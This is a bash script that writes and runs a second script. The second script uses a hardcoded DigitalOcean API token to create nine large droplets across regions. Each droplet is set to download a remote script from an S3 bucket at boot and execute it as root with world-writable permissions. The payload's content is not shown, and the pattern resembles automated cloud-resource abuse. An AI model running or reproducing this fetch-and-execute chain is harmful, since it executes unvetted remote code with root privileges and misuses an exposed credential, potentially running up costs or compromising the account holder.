#!/bin/bash
sleep 1m &&
cat > /usr/local/src/create9d.sh <<EOL
sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet2","region":"nyc1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"
	
sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet3","region":"nyc3","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"

sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet4","region":"sfo2","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"
	
sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet5","region":"ams3","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"

sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet6","region":"sgp1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"

sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet7","region":"lon1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"
	
sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet8","region":"fra1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"

sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet9","region":"tor1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"

sleep 1m; curl -X POST "https://api.digitalocean.com/v2/droplets" \
	-d'{"name":"My-Droplet10","region":"blr1","size":"s-6vcpu-16gb","image":"ubuntu-16-04-x64","tags":["kalinh"],"user_data":
	"#!/bin/bash
sleep 1m; sudo wget https://s3.us-east-2.amazonaws.com/ohio-storage-pri/haibegin.sh -O /usr/local/src/haibegin.sh && sudo chmod +777 /usr/local/src/haibegin.sh && sudo bash /usr/local/src/haibegin.sh"}' \
	-H "Authorization: Bearer f1e44f228e1d2aae48999135ebe04baf3cb7caf5df22a9dc60e1bb8685a6c16e" \
	-H "Content-Type: application/json"
EOL

sudo chmod +777 /usr/local/src/create9d.sh && sudo bash /usr/local/src/create9d.sh